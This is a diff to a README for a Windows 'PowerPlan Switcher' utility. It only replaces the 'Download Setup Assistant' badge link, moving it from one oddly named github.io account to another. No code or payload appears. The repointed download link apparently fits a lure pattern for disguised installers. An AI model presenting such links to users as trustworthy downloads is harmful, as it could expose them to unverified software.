@@ -5,7 +5,7 @@
 
 <h1 align="center">⚡ PowerPlan Switcher (Windows)</h1>
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-grey)](https://yudin5erafim.github.io/.github/power-switcher-tool)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-grey)](https://caidenvazquezigpg.github.io/.github/power-switcher-tool)
 
 <p align="center">
   <img src="https://i.ytimg.com/vi/FDOsK58vrLI/maxresdefault.jpg" alt="PowerPlan Switcher Interface Preview" width="700" />
